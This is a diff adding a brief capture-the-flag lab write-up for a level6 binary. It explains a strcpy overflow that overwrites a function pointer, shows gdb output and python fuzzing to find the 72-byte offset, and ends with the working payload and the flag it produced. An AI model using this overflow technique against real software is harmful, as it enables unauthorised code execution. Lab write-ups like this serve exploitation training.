@@ -1,0 +1,22 @@
+# For this level, we face an obvious overflow of strcpy, dest has a size
+	64 malloc(64) but argv[1] can be larger
+
+# We have to overwrite the function variable so we can call the n function
+
+(gdb) info func
+[...]
+0x08048454  n
+[...]
+
+level6@SnowCrash:~$ ./level6 $(python -c 'print "A"*71')
+Nope
+level6@SnowCrash:~$ ./level6 $(python -c 'print "A"*72')
+Segmentation fault (core dumped)
+
+# Our overflow occurs at char 72
+
+===================================================================================
+# This one was very easy ????
+
+level6@SnowCrash:~$ ./level6 $(python -c 'print "A"*72+"\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
